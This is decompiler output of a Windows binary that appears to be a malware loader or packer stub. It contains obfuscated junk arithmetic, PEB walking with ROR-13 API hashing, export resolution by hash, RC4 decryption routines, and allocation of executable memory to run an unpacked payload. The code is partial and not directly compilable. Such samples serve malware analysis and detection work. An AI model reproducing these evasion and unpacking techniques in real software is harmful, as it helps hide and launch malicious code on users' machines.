/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

unsigned int __fastcall sub_4010EC(int a1, int a2);
int (__fastcall *sub_4017AD())(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
int __thiscall sub_401C32(void *this);
int __cdecl sub_4021AF(int a1);
char sub_402821();
int __cdecl sub_402C1F(int a1, int a2, unsigned __int8 *a3);
// char __usercall sub_403607@<al>(_DWORD *a1@<ebp>);
unsigned int __cdecl sub_40361B(_BYTE *a1);
// void __usercall sub_403809(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>);
__int64 __cdecl sub_403969(__int64 a1);
int sub_403B23();
void sub_404D6E();
// int __userpurge sub_406D57@<eax>(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30, int a31, int a32, int a33, int a34, int a35, int a36, int a37, int a38, int a39, int a40, int a41, int a42, int a43, int a44, int a45, int a46, int a47, int a48, int a49, int a50, int a51, int a52, int a53, int a54, int a55, int a56, int a57, int a58, int a59, int a60, int a61, int a62, int a63);
int __fastcall sub_418B2E(int a1, int a2, int a3, int a4, int a5);
void __fastcall sub_418BD7(int a1, int a2);
// void __usercall sub_418CE7(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>);
void __stdcall sub_418E0C(int a1, int a2, int a3, int a4);
int __fastcall sub_4193D2(int a1, int a2, int a3, int a4);
// void __usercall start(int a1@<edx>, unsigned int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// int __userpurge sub_419C11@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebp>, int a5, int a6);
// int __usercall sub_419CEB@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5);
void __thiscall sub_41A237(void *this, int a2, int a3, int a4);
int __stdcall sub_41A284(int a1, int a2);
int __fastcall sub_41A35E(int a1, int a2, int a3, int a4);
void sub_41AD04();
int __thiscall sub_41B008(void *this, int a2, int a3, int a4, int a5);
// int __userpurge sub_41B5D9@<eax>(int a1@<eax>, int a2@<ecx>, int a3, int a4, int a5, int a6);
// int __usercall sub_41B652@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>);
// int __userpurge sub_41B7E6@<eax>(int result@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6);
// void __usercall sub_41EB46(bool a1@<zf>, char a2@<sf>, char a3@<of>, double a4@<st0>);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// HANDLE __stdcall GetCurrentProcess();
// DWORD __stdcall GetCurrentProcessId();
// DWORD __stdcall GetCurrentThreadId();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// LONG __stdcall InterlockedCompareExchange(volatile LONG *Destination, LONG Exchange, LONG Comperand);
// LONG __stdcall InterlockedDecrement(volatile LONG *lpAddend);
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_4230E5; // weak
_UNKNOWN unk_4231E5; // weak
int dword_443004 = 0; // weak
int dword_443008 = 0; // weak
int dword_44300C = 0; // weak
int dword_443010 = 0; // weak
int dword_443014 = 0; // weak
int dword_443018 = 0; // weak
int dword_44301C = 0; // weak
int dword_443020 = 0; // weak
int dword_443024 = 0; // weak
int dword_443028 = 0; // weak
int dword_44302C = 0; // weak
int dword_443034 = 0; // weak
int dword_443038 = 0; // weak
int dword_44303C = 0; // weak
int dword_443040 = 0; // weak
int dword_443044 = 0; // weak
int dword_443048 = 0; // weak
int dword_44304C = 0; // weak
int dword_443208 = 0; // weak
int dword_443254 = 0; // weak
int dword_44329C = 0; // weak
char byte_4433DC = '\0'; // weak
int dword_4434EC = -966918144; // weak
int dword_443734 = 6418944; // weak
int dword_44391C = -1312882688; // weak
int dword_44399C = -355863; // weak
char byte_443B20 = 'D'; // weak
int dword_443D00 = -758; // weak
_UNKNOWN dword_443DB0; // weak
int dword_443FC0 = 1159478530; // weak
_UNKNOWN dword_44417C; // weak
char byte_4444B0 = 'è'; // weak
int dword_4445E0 = -152449097; // weak
int *off_4445FC = &dword_443048; // weak
int dword_444674 = 2132098047; // weak
int (__stdcall *dword_4446B9)(_DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_4446BD)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_4446D9)(_DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_4446DD)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_4446E1)(_DWORD, _DWORD) = NULL; // weak
int dword_4446E5 = 521288629; // weak
_UNKNOWN unk_4446E9; // weak
int dword_4446ED = 0; // weak
int (__thiscall *dword_444705)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_444709)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN dword_44470D; // weak
int dword_444715 = 362436069; // weak
int dword_444719 = 0; // weak
int (__fastcall *dword_44471D)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_444725 = -1155873431; // weak
int dword_444729 = 0; // weak
int (__fastcall *dword_44472D)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_444731 = 0; // weak
_UNKNOWN unk_444749; // weak
int dword_44475F = 88675123; // weak
int dword_444763 = 0; // weak
int dword_44477B = 0; // weak
int dword_444783 = 156450; // weak
_UNKNOWN unk_444787; // weak
_UNKNOWN unk_44478F; // weak
char byte_444948 = '\0'; // weak
int dword_4449F0 = 0; // weak
char byte_444A90; // weak
char byte_444AE0; // weak
int dword_444B3C; // weak


//----- (004010EC) --------------------------------------------------------
unsigned int __fastcall sub_4010EC(int a1, int a2)
{
  unsigned int result; // eax
  unsigned int retaddr; // [esp+0h] [ebp+0h]

  LOBYTE(dword_443048) = -32;
  dword_444725 ^= a2 + 700;
  dword_443010 -= 28730;
  result = retaddr & 0xFFFF0000;
  dword_444731 = retaddr & 0xFFFF0000;
  dword_443010 -= 27593;
  return result;
}
// 443010: using guessed type int dword_443010;
// 443048: using guessed type int dword_443048;
// 444725: using guessed type int dword_444725;
// 444731: using guessed type int dword_444731;

//----- (004017AD) --------------------------------------------------------
int (__fastcall *sub_4017AD())(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD)
{
  int v0; // ecx
  _BYTE *v1; // edi
  char v2; // al
  _BYTE *v3; // edi
  int v4; // ecx
  int v5; // ecx
  unsigned __int8 v6; // bl
  char v7; // cf
  int v8; // ecx
  int v9; // ecx
  int v10; // esi
  int v11; // ebx
  char v12; // al
  int v13; // ecx
  HANDLE (__stdcall **v14)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD); // ebx
  _BYTE *v15; // edi
  int (__fastcall *result)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v17; // eax
  int v18; // esi
  int v19; // edx
  int v20; // eax
  int v21; // ecx
  BOOL (__stdcall **v22)(HANDLE); // edx
  int v23; // edx
  int v24; // ebx
  int v25; // ecx
  char v26; // cl
  int v27; // ecx
  int v28; // ecx
  int v29; // esi
  int v30; // ecx
  DWORD (__stdcall **v31)(); // ecx
  int v32; // edx
  int v33; // esi
  int v34; // [esp-8h] [ebp-8h]
  int v35; // [esp-4h] [ebp-4h]
  int v36; // [esp-4h] [ebp-4h]

  v22 = (BOOL (__stdcall **)(HANDLE))dword_444674;
  v0 = 0x2000;
  v1 = &unk_4231E5;
  v33 = 27841;
  do
  {
    dword_443010 -= (int)v22;
    dword_443008 -= v33;
    dword_443008 -= (int)v22;
    v36 = v0;
    v11 = v0;
    v12 = sub_403B23();
    LOBYTE(dword_443024) = dword_443024 - 89;
    dword_443040 += v33;
    *v1++ = v12;
    v22 = &CloseHandle;
    v33 = (int)&GetCurrentThreadId;
    v0 = v36 - 1;
  }
  while ( v36 != 1 );
  dword_443004 -= v11;
  dword_443048 += v11;
  dword_4446B9(255, &unk_4230E5);
  v9 = v8 - (v7 + 4395);
  LOBYTE(v9) = byte_4433DC + v9;
  dword_443004 = (int)&InterlockedDecrement;
  LOBYTE(dword_443028) = -93;
  dword_443034 = (int)&InterlockedDecrement;
  dword_44303C += 11683;
  dword_443024 = v23;
  v24 = dword_443208;
  dword_444705(v9, &unk_4230E5, &unk_444749, 0, &unk_44478F);
  LOBYTE(dword_443040) = dword_443040 + 96;
  dword_443004 = 26492;
  dword_44304C -= (int)&VirtualAlloc;
  LOBYTE(dword_443024) = dword_443024 - 83;
  v31 = &GetCurrentProcessId;
  BYTE1(v31) = byte_443B20 + ((unsigned __int16)&GetCurrentProcessId >> 8);
  v17 = dword_44471D(v31, (char *)&VirtualAlloc - 1, &unk_44478F, -1073741824, 1, 0, 2, 32, 0);
  dword_443020 = (int)&GetCurrentProcessId;
  dword_443004 = 27616;
  v29 = (char *)&GetCurrentProcessId - (char *)off_4445FC;
  dword_44302C -= v24;
  dword_443048 = v24;
  dword_44472D(8467, dword_443D00 + 13983, v17, &unk_4231E5, 0x2000, &dword_4446BD, 0, v17);
  dword_443010 = v29;
  LOBYTE(v30) = -73;
  dword_4446E1(v30, 5200);
  v4 = 0x2000;
  v10 = dword_443008;
  v3 = &unk_4231E5;
  dword_44302C = dword_443008;
  do
  {
    dword_44302C -= 17735;
    v34 = v4;
    v10 += dword_444B3C;
    dword_44301C -= v10;
    v2 = sub_403B23();
    LOBYTE(dword_44304C) = dword_44304C - 12;
    *v3++ = v2;
    dword_443038 = v10;
    v4 = v34 - 1;
  }
  while ( v34 != 1 );
  dword_443048 -= 11012;
  LOBYTE(dword_443014) = dword_443014 + 50;
  LOBYTE(dword_443014) = dword_443014 - 109;
  result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4021AF(1769630462);
  if ( result )
  {
    dword_4446BD = result;
    result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4021AF(976580703);
    if ( result )
    {
      dword_4446DD = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
      dword_443024 = 29805;
      result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))dword_4446BD(
                                                                                     dword_44417C,
                                                                                     v32 + 6676,
                                                                                     0,
                                                                                     0x2000,
                                                                                     12288,
                                                                                     64);
      if ( result )
      {
        LOBYTE(dword_44304C) = dword_44304C - 92;
        dword_44470D = (int)result;
        dword_443038 = 29169;
        LOBYTE(dword_44300C) = 0;
        v5 = dword_44329C + v13;
        BYTE1(v5) += byte_444948;
        v35 = dword_44471D(dword_4445E0 + v5, dword_443DB0, &unk_44478F, -1073741824, 1, 0, 3, 0, 0);
        LOBYTE(dword_44302C) = -78;
        v6 = byte_444A90 + dword_44399C - 15;
        dword_444709(&GetCurrentProcess, &InterlockedCompareExchange, v35, dword_44470D, 0x2000, &unk_4230E5, 0, v35);
        dword_44303C = 3263;
        dword_4446E1(v25, v6);
        LOBYTE(v27) = v26 - byte_4444B0;
        BYTE1(v27) = -114;
        dword_4446D9(v27, &unk_44478F);
        LOBYTE(dword_443014) = dword_443014 + 74;
        v21 = 0x2000;
        v18 = dword_44470D;
        v19 = 0;
        v20 = 0;
        dword_443024 = (int)&GetModuleHandleA;
        do
        {
          LOBYTE(v20) = *(_BYTE *)v18++;
          v19 += v20;
          v20 = 0;
          --v21;
        }
        while ( v21 );
        dword_443010 = 31738;
        dword_444763 = v19;
        dword_443024 -= 31738;
        dword_443028 = 0;
        dword_443048 += v18;
        LOBYTE(v19) = (v19 ^ 0x4F) + 93;
        LOBYTE(dword_443024) = -81;
        dword_4446DD(&GetCurrentThreadId, v19, dword_44470D, 0, 0x8000);
        result = 0;
        dword_443040 -= dword_4449F0;
        v28 = 0x2000;
        v14 = &CreateThread;
        v15 = &unk_4231E5;
        do
        {
          v14 = (HANDLE (__stdcall **)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))((char *)v14 + dword_443FC0);
          *v15++ = 0;
          --v28;
        }
        while ( v28 );
      }
    }
  }
  return result;
}
// 401241: conditional instruction was optimized away because of '%0x18.4==1'
// 401309: variable 'v13' is possibly undefined
// 402D6C: variable 'v25' is possibly undefined
// 402D72: variable 'v26' is possibly undefined
// 4021C0: variable 'v27' is possibly undefined
// 401546: variable 'v8' is possibly undefined
// 401546: variable 'v7' is possibly undefined
// 402D35: variable 'v23' is possibly undefined
// 4032C5: variable 'v30' is possibly undefined
// 402CF5: variable 'v32' is possibly undefined
// 443004: using guessed type int dword_443004;
// 443008: using guessed type int dword_443008;
// 44300C: using guessed type int dword_44300C;
// 443010: using guessed type int dword_443010;
// 443014: using guessed type int dword_443014;
// 44301C: using guessed type int dword_44301C;
// 443020: using guessed type int dword_443020;
// 443024: using guessed type int dword_443024;
// 443028: using guessed type int dword_443028;
// 44302C: using guessed type int dword_44302C;
// 443034: using guessed type int dword_443034;
// 443038: using guessed type int dword_443038;
// 44303C: using guessed type int dword_44303C;
// 443040: using guessed type int dword_443040;
// 443048: using guessed type int dword_443048;
// 44304C: using guessed type int dword_44304C;
// 443208: using guessed type int dword_443208;
// 44329C: using guessed type int dword_44329C;
// 4433DC: using guessed type char byte_4433DC;
// 44399C: using guessed type int dword_44399C;
// 443B20: using guessed type char byte_443B20;
// 443D00: using guessed type int dword_443D00;
// 443DB0: using guessed type int dword_443DB0;
// 443FC0: using guessed type int dword_443FC0;
// 44417C: using guessed type int dword_44417C;
// 4444B0: using guessed type char byte_4444B0;
// 4445E0: using guessed type int dword_4445E0;
// 4445FC: using guessed type int *off_4445FC;
// 444674: using guessed type int dword_444674;
// 4446B9: using guessed type int (__stdcall *dword_4446B9)(_DWORD, _DWORD);
// 4446BD: using guessed type int (__fastcall *dword_4446BD)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4446D9: using guessed type int (__thiscall *dword_4446D9)(_DWORD, _DWORD);
// 4446DD: using guessed type int (__fastcall *dword_4446DD)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4446E1: using guessed type int (__fastcall *dword_4446E1)(_DWORD, _DWORD);
// 444705: using guessed type int (__thiscall *dword_444705)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444709: using guessed type int (__fastcall *dword_444709)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44470D: using guessed type int dword_44470D;
// 44471D: using guessed type int (__fastcall *dword_44471D)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44472D: using guessed type int (__fastcall *dword_44472D)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444763: using guessed type int dword_444763;
// 444948: using guessed type char byte_444948;
// 4449F0: using guessed type int dword_4449F0;
// 444A90: using guessed type char byte_444A90;
// 444B3C: using guessed type int dword_444B3C;

//----- (00401C32) --------------------------------------------------------
int __thiscall sub_401C32(void *this)
{
  int v1; // ecx
  int v2; // ebx
  int v3; // eax
  unsigned __int8 *v4; // esi
  int v5; // edi
  bool v6; // cf
  int result; // eax
  _DWORD *v8; // edx

  dword_443014 = (int)this;
  v8 = (_DWORD *)*((_DWORD *)NtCurrentPeb()->ImageBaseAddress + 5);
  LOBYTE(dword_443028) = 113;
  dword_44303C += (int)&LocalAlloc;
  do
  {
    v4 = (unsigned __int8 *)v8[10];
    v1 = 24;
    dword_44303C = dword_443734 - 19675;
    v5 = 0;
    LOBYTE(dword_443044) = dword_443044 + 108;
    do
    {
      dword_44301C = 15555;
      v3 = *v4++;
      if ( (char)v3 >= 97 )
        LOBYTE(v3) = v3 - 32;
      v5 = v3 + __ROR4__(v5, 13);
      v6 = __CFADD__((_BYTE)dword_443028, -63);
      LOBYTE(dword_443028) = dword_443028 - 63;
      --v1;
    }
    while ( v1 );
    v2 = v8[4];
    v8 = (_DWORD *)*v8;
    dword_44301C = (int)&v4[__CFADD__(v6, 3451) + 7277];
  }
  while ( v5 != 1783282779 );
  result = v2;
  LOBYTE(dword_443010) = dword_443010 + 119;
  return result;
}
// 443010: using guessed type int dword_443010;
// 443014: using guessed type int dword_443014;
// 44301C: using guessed type int dword_44301C;
// 443028: using guessed type int dword_443028;
// 44303C: using guessed type int dword_44303C;
// 443044: using guessed type int dword_443044;
// 443734: using guessed type int dword_443734;

//----- (004021AF) --------------------------------------------------------
int __cdecl sub_4021AF(int a1)
{
  int v2; // ebx
  unsigned int i; // esi
  void *v4; // ecx
  _DWORD *v5; // edi
  unsigned __int16 *v6; // [esp+18h] [ebp-Ch]
  _DWORD *v7; // [esp+1Ch] [ebp-8h]
  int v8; // [esp+20h] [ebp-4h]

  v2 = sub_401C32(v4);
  v5 = (_DWORD *)(v2 + *(_DWORD *)(v2 + *(_DWORD *)(v2 + 60) + 120));
  if ( HIWORD(a1) )
  {
    v7 = (_DWORD *)(v2 + v5[8]);
    v6 = (unsigned __int16 *)(v2 + v5[9]);
    for ( i = 0; v5[6] > i; ++i )
    {
      if ( sub_40361B((_BYTE *)(v2 + *v7)) == a1 )
      {
        v8 = *v6;
        break;
      }
      ++v7;
      ++v6;
    }
    if ( v5[6] == i )
      return 0;
  }
  else
  {
    v8 = (unsigned __int16)a1 - v5[4];
  }
  return v2 + *(_DWORD *)(v2 + v5[7] + 4 * v8);
}
// 4011D7: variable 'v4' is possibly undefined
// 403A6B: variable 'v8' is possibly undefined

//----- (00402821) --------------------------------------------------------
char sub_402821()
{
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  return sub_403607(&savedregs);
}

//----- (00402C1F) --------------------------------------------------------
int __cdecl sub_402C1F(int a1, int a2, unsigned __int8 *a3)
{
  unsigned __int8 v3; // bl
  int result; // eax
  unsigned int i; // esi
  char v6; // cl
  unsigned int v7; // esi
  _BYTE *v8; // eax
  __int64 v9; // [esp-8h] [ebp-1Ch]
  unsigned __int8 *v10; // [esp+Ch] [ebp-8h]
  unsigned __int8 v11; // [esp+13h] [ebp-1h]

  v7 = 0;
  v8 = a3;
  do
  {
    v6 = v7++;
    *v8++ = v6;
  }
  while ( v7 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v11 = 0;
  v3 = 0;
  v10 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v3 = (v3 + *v10 + *(unsigned __int8 *)(a1 + v11)) % 256;
    HIDWORD(v9) = &a3[v3];
    LODWORD(v9) = &a3[i];
    sub_403969(v9);
    result = (v11 + 1) / a2;
    v11 = (v11 + 1) % a2;
    ++v10;
  }
  return result;
}

//----- (00403607) --------------------------------------------------------
char __usercall sub_403607@<al>(_DWORD *a1@<ebp>)
{
  char result; // al
  int v2; // esi
  unsigned __int8 v3; // bl
  __int64 v4; // [esp-8h] [ebp-14h]

  v3 = *(_BYTE *)(a1[4] + 256);
  *((_BYTE *)a1 - 1) = *(_BYTE *)(a1[4] + 257);
  v2 = a1[4];
  *(a1 - 2) = 0;
  for ( *(a1 - 3) = a1[2]; *(a1 - 2) < a1[3]; ++*(a1 - 3) )
  {
    v3 = (v3 + 1) % 256;
    *((_BYTE *)a1 - 1) += *(_BYTE *)(v2 + v3);
    HIDWORD(v4) = v2 + *((unsigned __int8 *)a1 - 1);
    LODWORD(v4) = v2 + v3;
    sub_403969(v4);
    *(_BYTE *)*(a1 - 3) ^= *(_BYTE *)(v2
                                    + (unsigned __int8)(*(_BYTE *)(v2 + *((unsigned __int8 *)a1 - 1))
                                                      + *(_BYTE *)(v2 + v3)));
    ++*(a1 - 2);
  }
  *(_BYTE *)(a1[4] + 256) = v3;
  result = *((_BYTE *)a1 - 1);
  *(_BYTE *)(a1[4] + 257) = result;
  return result;
}

//----- (0040361B) --------------------------------------------------------
unsigned int __cdecl sub_40361B(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (00403809) --------------------------------------------------------
void __usercall sub_403809(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  dword_44302C = 22073;
  qmemcpy(a2, a3, a1);
  LOBYTE(dword_443034) = dword_443034 - 88;
}
// 44302C: using guessed type int dword_44302C;
// 443034: using guessed type int dword_443034;

//----- (00403969) --------------------------------------------------------
__int64 __cdecl sub_403969(__int64 a1)
{
  __int64 result; // rax
  char v2; // cl

  result = a1;
  v2 = *(_BYTE *)a1;
  *(_BYTE *)a1 = *(_BYTE *)HIDWORD(a1);
  *(_BYTE *)HIDWORD(a1) = v2;
  return result;
}

//----- (00403B23) --------------------------------------------------------
int sub_403B23()
{
  unsigned int v1; // eax
  int v2; // ebx

  dword_443038 = 5318;
  v1 = dword_444783 ^ (dword_444783 << 11);
  dword_444783 = dword_444715;
  dword_44301C -= 29046;
  LOBYTE(dword_443024) = dword_443024 - 75;
  dword_444715 = dword_4446E5;
  dword_4446E5 = dword_44475F;
  v2 = dword_4434EC + 849;
  LOBYTE(v2) = dword_4434EC + 80;
  BYTE1(v2) = ((unsigned __int16)(dword_4434EC + 849) >> 8) - byte_444AE0;
  LOBYTE(dword_44303C) = dword_44303C + 34;
  dword_443018 -= v2;
  dword_443010 = dword_443254 + 15993;
  dword_44475F ^= (v1 >> 8) ^ v1 ^ ((unsigned int)dword_44475F >> 19);
  dword_443014 -= dword_443254 + 15993;
  dword_4446ED = dword_44475F;
  LOBYTE(dword_443024) = dword_443024 + 92;
  dword_443020 = dword_443254 + 15993;
  return dword_44475F;
}
// 443010: using guessed type int dword_443010;
// 443014: using guessed type int dword_443014;
// 443018: using guessed type int dword_443018;
// 44301C: using guessed type int dword_44301C;
// 443020: using guessed type int dword_443020;
// 443024: using guessed type int dword_443024;
// 443038: using guessed type int dword_443038;
// 44303C: using guessed type int dword_44303C;
// 443254: using guessed type int dword_443254;
// 4434EC: using guessed type int dword_4434EC;
// 4446E5: using guessed type int dword_4446E5;
// 4446ED: using guessed type int dword_4446ED;
// 444715: using guessed type int dword_444715;
// 44475F: using guessed type int dword_44475F;
// 444783: using guessed type int dword_444783;
// 444AE0: using guessed type char byte_444AE0;

//----- (00404D6E) --------------------------------------------------------
void sub_404D6E()
{
  unsigned int v0; // kr00_4

  v0 = __getcallerseflags();
  __asm { retn }
}

//----- (00406D57) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __userpurge sub_406D57@<eax>(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30, int a31, int a32, int a33, int a34, int a35, int a36, int a37, int a38, int a39, int a40, int a41, int a42, int a43, int a44, int a45, int a46, int a47, int a48, int a49, int a50, int a51, int a52, int a53, int a54, int a55, int a56, int a57, int a58, int a59, int a60, int a61, int a62, int a63)
{
  void *retaddr[2]; // [esp+0h] [ebp+0h]

  return MK_FP(retaddr[0], retaddr[0])();
}
// 406D5D: bad sp value at call
// 406D57: too many input arguments, some ignored

//----- (00418B2E) --------------------------------------------------------
int __fastcall sub_418B2E(int a1, int a2, int a3, int a4, int a5)
{
  int v5; // edx
  int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // ecx
  int v9; // ecx
  int v11; // edx
  unsigned int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // ecx
  bool v16; // cf
  __int16 v17; // ax
  unsigned int v18; // eax
  int v19; // eax
  int v20; // [esp+44h] [ebp-250h]
  int v21; // [esp+68h] [ebp-22Ch]
  char v22[44]; // [esp+84h] [ebp-210h] BYREF
  char v23[4]; // [esp+B0h] [ebp-1E4h] BYREF
  char v24[52]; // [esp+B4h] [ebp-1E0h] BYREF
  char v25[172]; // [esp+E8h] [ebp-1ACh] BYREF
  char v26[16]; // [esp+194h] [ebp-100h] BYREF
  char v27[60]; // [esp+1A4h] [ebp-F0h] BYREF
  unsigned int v28; // [esp+1E0h] [ebp-B4h]
  int v29; // [esp+204h] [ebp-90h]
  unsigned __int8 v30; // [esp+25Ch] [ebp-38h]

  sub_4193D2(0, a2, 0, v21);
  sub_419CEB(0, v11, (int)v22, (int)v22, 0);
  sub_41B5D9(v30 ^ 0x3325, v15, (int)v23, 0, 24, 8);
  sub_419CEB((int)v25, v5, v6, (int)v25, 0);
  v17 = 5365;
  v16 = v8 < v7;
  if ( v8 < v7 )
    goto LABEL_2;
  LOWORD(v18) = 12701;
  if ( v8 != v28 )
    goto LABEL_7;
  v18 = (v8 < v28) + 14594;
  if ( v18 > v8 )
    goto LABEL_8;
  v14 = 0;
  if ( (v8 & 0x3A19) != 0 )
  {
LABEL_14:
    v13 = ((v14 | 0x1E16) ^ 0x1422) - 7759;
    goto LABEL_9;
  }
  v13 = 8467;
  if ( v20 == v7 )
  {
    v17 = 7343;
    v16 = 0;
LABEL_2:
    v12 = ((((v17 + v16 + v17) & 0xAFE) + 16339) | 0x2896) - v29;
    v18 = ((__PAIR64__(v12 - 15369, v12) - 0xCB00003C09i64) >> 32) - 10806;
LABEL_7:
    LOWORD(v18) = v18 | 0x1AC1;
LABEL_8:
    v14 = v18 & 0x33AB;
    goto LABEL_14;
  }
LABEL_9:
  v19 = sub_419CEB(v13, (int)v24, v8, (int)v24, 0);
  sub_41B5D9(v19, (int)v27, (int)v27, 0, 35, 53);
  return sub_41A35E(v9, (int)v26, 30, (int)v26);
}
// 418B40: variable 'v21' is possibly undefined
// 419966: variable 'v11' is possibly undefined
// 41A32D: variable 'v15' is possibly undefined
// 418DF6: variable 'v5' is possibly undefined
// 418DF6: variable 'v6' is possibly undefined
// 419C76: variable 'v20' is possibly undefined
// 419C76: variable 'v7' is possibly undefined
// 419ED5: variable 'v8' is possibly undefined
// 419037: variable 'v9' is possibly undefined

//----- (00418BD7) --------------------------------------------------------
void __fastcall sub_418BD7(int a1, int a2)
{
  int v2; // ecx
  int v3; // edx
  void *v4; // ecx
  __int16 v5; // ax
  unsigned int v6; // edx
  int v7; // eax
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  int v12; // [esp-23Ch] [ebp-240h] BYREF
  int v13; // [esp-228h] [ebp-22Ch]
  _DWORD v14[21]; // [esp-220h] [ebp-224h] BYREF
  int v15; // [esp-1CCh] [ebp-1D0h]
  int v16[67]; // [esp-188h] [ebp-18Ch] BYREF
  _BYTE v17[108]; // [esp-7Ch] [ebp-80h] BYREF
  unsigned int v18; // [esp-10h] [ebp-14h]
  int v19; // [esp-Ch] [ebp-10h]
  int *v20; // [esp-8h] [ebp-Ch]
  int v21; // [esp-4h] [ebp-8h]

  sub_41A35E((int)v14, a2, 39, (int)v14);
  sub_41A284(10, v16[6]);
  sub_41A284(1, v2);
  sub_418E0C(0, (int)v17, (int)v17, 0);
  sub_41A35E(v11, (int)v17, 23, (int)v17);
  sub_41A284(9, 2136167811);
  sub_403B23();
  v8 = (((sub_41A284(57, 1203005452) | 0x32CE) + 8138) ^ 0x30CB) - 10514;
  if ( !v9 )
    v15 |= v8;
  sub_418E0C(0, v18, (int)&v12, 0);
  v5 = sub_41B008(v4, 24, 55, 6, v3);
  v7 = __CFADD__(v5 & 0x1471, 6930) + (v5 & 0x1471) + 6930 + 6381;
  if ( !v7
    || (v10 = v7 + 10662 + __CFADD__(v7, 10662) + v7 + 10662,
        v13 += __CFADD__(v10, v10) + 2 * v10 + 11951 - v14[19],
        v6 >= v18) )
  {
    JUMPOUT(0x41B6C9);
  }
  v21 = 0;
  v20 = v16;
  v19 = 0;
  JUMPOUT(0x418D8D);
}
// 419591: control flows out of bounds to 41B6C9
// 41A303: control flows out of bounds to 418D8D
// 419731: variable 'v2' is possibly undefined
// 41BA72: variable 'v11' is possibly undefined
// 419447: variable 'v6' is possibly undefined
// 419F93: variable 'v9' is possibly undefined
// 419EB8: variable 'v4' is possibly undefined
// 419EB8: variable 'v3' is possibly undefined

//----- (00418CE7) --------------------------------------------------------
void __usercall sub_418CE7(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>)
{
  int v3; // ecx
  int v4; // edx
  int v5; // ecx
  int v6; // ecx
  int v7; // edx
  int v8; // [esp-108h] [ebp-10Ch] BYREF
  int v9; // [esp-88h] [ebp-8Ch] BYREF

  sub_41B652(a1, a2, a3);
  sub_41B5D9(0, v6, (int)&v8, 0, 2, 36);
  sub_41A284(17, v7);
  sub_41A35E(v5, v4, 4, (int)&v9);
  sub_4010EC(v3, dword_4446ED);
  __asm { retn }
}
// 419DEA: variable 'v6' is possibly undefined
